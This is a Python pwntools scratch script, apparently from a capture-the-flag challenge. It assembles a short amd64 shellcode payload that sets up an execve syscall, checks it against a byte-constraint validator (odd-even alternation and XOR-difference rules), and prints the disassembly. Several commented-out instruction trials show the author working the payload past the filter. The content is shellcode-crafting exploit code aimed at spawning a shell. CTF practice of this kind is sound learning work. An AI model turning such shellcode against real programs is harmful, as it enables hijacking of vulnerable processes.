from pwn import *
context.arch = 'amd64'
# sub byte ptr [rdi + 10], 0x17
# mov word ptr [rsi + 11], 0x7116
# mov dword ptr [rsi + 11], 0x51607116
# dec byte ptr [rdi + 12]

    # mov edx, edx
    # dec dword ptr [rax + 13]
    # mov ecx, ecx
    # dec byte ptr [rdi + 12]
payload = asm('''
    gs pop rax
    leave
    mov al, 59
    fs pop rdi
    mov di, 0x1ffe
''')
'''
    .byte 0x48
    .byte 0xc7
    .byte 0xc8
    .byte 0x08
    .byte 0x20
    .byte 0x40
    .byte 0x00'''
    # mov rdi, 0x402008 = \x48\xc7\xc7\x08\x20\x40\x00
    
    # xchg rdi, r13

def is_valid_shellcode(payload, buf_len=32):
    if len(payload) > buf_len:
        return False, "Payload too long"

    # Ensure NOP padding
    # if len(payload) < buf_len:
    #     payload += b'\x90' * (buf_len - len(payload))

    err = False

    # Step 1: Check NOP padding
    # for i in range(len(payload), buf_len):
    #     if payload[i] != 0x90:
    #         return False, "NOP padding violation"

    # Step 2: Odd-Even alternation
    for i in range(len(payload) - 1):
        if (payload[i] ^ payload[i + 1]) & 1 != 1:
            return False, f"at index {i} Odd-even constraint violation"

    # Step 3: XOR difference constraint
    for i in range(len(payload) - 1):
        if (payload[i] ^ payload[i + 1]) > 0xC0:
            return False, f"at index {i} XOR difference too high"

    # Step 4: XOR low difference check
    for i in range(len(payload) - 2):
        if (payload[i] ^ payload[i + 2]) < 0x20:
            return False, f"at index {i} XOR difference too low"

    return True, "Valid shellcode"

valid, message = is_valid_shellcode(payload)
print(disasm(payload))
print(message)